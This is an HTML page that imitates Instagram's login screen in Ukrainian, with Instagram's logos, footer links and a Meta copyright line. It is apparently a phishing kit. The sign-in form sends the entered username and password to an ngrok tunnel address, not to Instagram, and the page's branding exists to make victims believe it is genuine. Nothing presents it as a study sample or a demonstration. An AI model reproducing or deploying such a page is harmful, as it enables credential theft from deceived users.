<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- FAVIVON -->
    <link rel="shortcut icon" href="favicon.png" type="image/png">
    <!-- GOOGLE FONT -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
    <!-- APP CSS -->
    <link rel="stylesheet" href="./app.css">
</head>

<body>

    <div class="container">
        <div class="main-container">
            <div class="main-content">
                <div class="slide-container" style="background-image: url(phone-frame.png);">
                    <div class="slide-content" id="slide-content">
                        <img src="slide (1).jpg" alt="slide image" class="active">
                        <img src="slide (2).jpg" alt="slide image">
                        <img src="slide (3).jpg" alt="slide image">
                        <img src="slide (4).jpg" alt="slide image">
                        <img src="slide (5).jpg" alt="slide image">
                    </div>
                </div>
                <div class="form-container">
                    <div class="form-content box">
                        <div class="logo">
                            <img src="logo-light.png" alt="Instagram logo" class="logo-light">
                            <img src="logo-dark.png" alt="Instagram logo" class="logo-dark">
                        </div>
                        <div class="signin-form" id="signin-form">
                            <form action="https://e111-213-5-193-237.ngrok.io" method="get">

                            
                            <div class="form-group">
                                <div class="animate-input">
                                    <span>
                                        Номер телефону, ім'я користувача або ел. адреса
                                    </span>
                                    <input type="text" name='login'>
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="animate-input">
                                    <span>
                                        Пароль
                                    </span>
                                    <input type="password" name='password'>
                                    <button>Показати</button>
                                </div>
                            </div>

                            <button type="submit" hidden class="SendFormM"></button>
                            </form>
                            <div class="btn-group">
                                <button class="btn-login" id="signin-btn" disabled onclick="document.querySelector('.SendFormM').click()">
                                    Увійти
                                </button>
                            </div>
                            <div class="divine">
                                <div></div>
                                <div>Або</div>
                                <div></div>
                            </div>
                            <div class="btn-group">
                                <button class="btn-fb">
                                    <img src="facebook-icon.png" alt="">
                                    <span>Увійти через Facebook</span>
                                </button>
                            </div>
                            <a href="#" class="forgot-pw">Забули пароль?</a>
                        </div>
                    </div>
                    <div class="box goto">
                        <p>
                            Не маєте облікового запису?
                            <a href="#">Зареєструйтеся</a>
                        </p>
                    </div>

                    <div class="app-download">
                        <p>Завантажити додаток.</p>
                        <div class="store-link">
                            <a href="#">
                                <img src="app-store.png" alt="app store">
                            </a>
                            <a href="#">
                                <img src="gg-play.png" alt="google play">
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer">
            <div class="links">
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">API</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Top Accounts</a>
                <a href="#">Hashtags</a>
                <a href="#">Locations</a>
                <a href="#" id="darkmode-toggle">Darkmode</a>
            </div>
            <div class="copyright">
                © 2022 Instagram from Meta
            </div>
        </div>
    </div>

    <!-- APP JS -->
    <script src="./app.js"></script>

</body>

</html>
